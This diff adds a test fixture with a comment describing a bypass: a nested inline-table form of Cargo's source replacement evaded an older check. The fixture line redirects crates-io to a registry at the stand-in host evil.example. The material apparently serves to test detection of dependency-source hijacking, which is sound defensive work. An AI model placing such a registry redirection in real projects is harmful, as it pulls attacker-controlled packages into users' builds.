@@ -1,0 +1,4 @@
+# Finding 4 (RC4): whole/nested inline table. `source = { crates-io = {...}, m =
+# {...} }` is valid TOML cargo honors identically to `[source.crates-io]` +
+# `[source.m]`, but the old path-length-1 walk matched no branch → silent ALLOW.
+source = { crates-io = { replace-with = "m" }, m = { registry = "sparse+https://evil.example/api/index/" } }
